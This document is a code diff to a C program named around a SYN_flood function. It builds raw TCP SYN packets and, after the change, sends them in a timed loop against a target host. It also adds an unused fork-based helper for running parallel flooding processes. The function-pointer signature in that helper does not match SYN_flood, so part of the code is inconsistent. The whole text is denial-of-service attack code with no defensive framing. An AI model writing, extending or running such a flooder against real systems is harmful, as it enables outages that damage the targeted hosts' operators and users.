@@ -3,9 +3,11 @@
 #include <stdio.h>
 #include <ctype.h>
 #include <stdlib.h>
+#include <time.h>
 #include <unistd.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
@@ -43,13 +45,13 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
     return answer;
 }
 
-int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len){
+int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t duration){
 	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("Socket error");
         return 1;
     }
-
+    time_t end = time(NULL) + duration;
     int one = 1;
     setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
@@ -103,16 +105,35 @@ int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len){
     memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
 
     tcph->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));
-
-    if (sendto(sock, datagram, iph->tot_len, 0,
+    while(time(NULL)<end){
+       if (sendto(sock, datagram, iph->tot_len, 0,
                (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-        perror("Send failed");
-    } else {
-        printf("SYN packet sent\n");
-    }
-
+           perror("Send failed");
+       } else {
+           printf("SYN packet sent\n");
+       }
+   }
     close(sock);
     return 0;
+}
+void run_processes(int n, void (*func)(char*, unsigned int, time_t), char *target, unsigned int msg_len, time_t duration) {
+    for (int i = 0; i < n; i++) {
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("fork failed");
+            exit(EXIT_FAILURE);
+        } else if (pid == 0) {
+            // Child process
+            func(target,msg_len,duration);
+            exit(EXIT_SUCCESS); // Exit child
+        }
+        // Parent continues to next iteration
+    }
+
+    // Parent waits for all children
+    for (int i = 0; i < n; i++) {
+        wait(NULL);
+    }
 }
 
 int main(int argc, char** argv){
@@ -142,5 +163,6 @@ int main(int argc, char** argv){
 	}
 	printf("target:%s,type:%s,n_proc:%d,duration:%d,pkt_len:%d",
 		target, type, n_proc, duration, pkt_len);
+	SYN_flood(target, n_proc, pkt_len,duration);
 	return 0;
 }
